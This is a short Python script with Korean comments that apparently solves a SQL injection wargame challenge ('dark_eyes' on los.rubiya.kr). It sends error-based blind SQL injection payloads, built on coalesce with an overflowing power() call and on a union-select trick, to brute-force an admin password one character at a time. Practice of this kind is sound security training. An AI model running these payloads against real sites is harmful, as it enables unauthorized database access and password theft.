# short circuit Evaluation을 이용한 Error based Blind Sql Inejction

import string
import requests

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
cookies = {"PHPSESSID" :'tlvt0ab35aevn9d77gv9lsc1uu' }
params = {'pw' : None }

# 비밀번호 길이 구하기
# 비밀번호 길이 8
for i in range(6,9):
    payload = "' or id='admin' and coalesce((select pw where length(pw)={}),power(12341234,12341234))#".format(i)
    params['pw'] = payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if(len(response.content) > 0):
        print("[+] find the length :",i)


# coalesce를 활용한 풀이
flag = ''
for i in range(1,9):
    for j in string.printable:
        payload = "' or id='admin' and coalesce((select pw where ascii(substr(pw,{},1))={}),power(12341234,12341234))#".format(i,ord(j))
        params['pw'] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if(len(response.content) > 0):
            flag += j
            print("[+] find the pw :",flag)
            break

# Union select를 활용한 풀이
flag = ''
for i in range(1,9):
    for j in string.printable:
        payload = "'= (select 1 union select 2 where id='admin' and substr(pw,{},1)='{}')#".format(i,j)
        params['pw'] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if(len(response.content) == 0 ):
            flag += j
            print("[+] find the pw :",flag)
            break


print(flag)

ord('k')